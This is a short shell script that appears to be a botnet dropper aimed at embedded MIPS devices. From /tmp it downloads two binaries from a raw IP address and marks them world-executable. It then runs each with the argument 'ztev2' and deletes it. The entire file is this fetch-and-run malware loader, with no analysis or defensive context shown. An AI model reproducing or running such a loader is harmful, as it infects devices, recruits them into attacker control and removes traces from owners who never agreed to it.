#!/bin/sh
cd /tmp;wget http://45.95.146.126/splmips; chmod 777 *;./splmips ztev2;rm -rf splmips
cd /tmp;wget http://45.95.146.126/splmpsl; chmod 777 *;./splmpsl ztev2;rm -rf splmpsl
